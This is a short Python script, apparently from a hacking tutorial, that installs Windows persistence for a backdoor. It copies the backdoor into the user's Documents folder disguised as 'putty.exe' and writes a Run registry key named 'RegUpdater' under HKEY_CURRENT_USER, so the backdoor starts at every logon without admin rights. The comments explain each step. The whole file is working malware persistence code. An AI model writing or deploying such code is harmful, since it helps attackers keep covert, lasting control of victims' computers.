import os # need for getting working dir
import shutil # needed for file copying
import subprocess # needed for getting user profile
import _winreg as wreg # needed for editing registry

# reconn phase

# get current working directory where the backdoor gets executed
# we use the output to build our source path
# could be sth like:
# C:\Windows\System32 or C:\Users\XY\Desktop\XY
path = os.getcwd().strip('/n')

# get user profile which contains the username, store in userprof var
# C:\Windows\System32>set USERPROFILE
# USERPROFILE=C:\Users\Max
Null, userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')

# build dest path where we copy our backdor - we choose C:\Users\XY\Documents\
destination = userprof.strip('\n\r') + '\\Documents\\' + 'putty.exe'

# reconn phase 1 & 2

# verify if our script was run before and putty copied to our destination
if not os.path.exists(destination):

    # first time our backdoor gets executed
    # copy our backdoor to our destination - C:\Users\XY\Documents\
    shutil.copyfile(path + '\putty.exe', destination)

    # create registry key called Regupdater pointing to our  new backdoor path (destination)
    # we use HKEY_CURRENT_USER path, so we do not need admin priv
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ, destination)
    key.Close()

